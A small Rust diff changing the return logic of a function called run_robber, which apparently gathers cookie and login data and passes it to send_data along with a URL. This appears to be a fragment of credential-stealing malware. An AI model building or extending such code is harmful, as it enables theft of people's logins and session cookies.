@@ -81,8 +81,7 @@ pub fn run_robber(do_cookie: bool, do_login: bool, url: &str) -> Result<i32, any
                     robber::send_data(login_data, url)?;
                 }
             }
-            return Ok(0);
         }
     }
-    Err(anyhow!(1))
+    return Ok(0);
 }
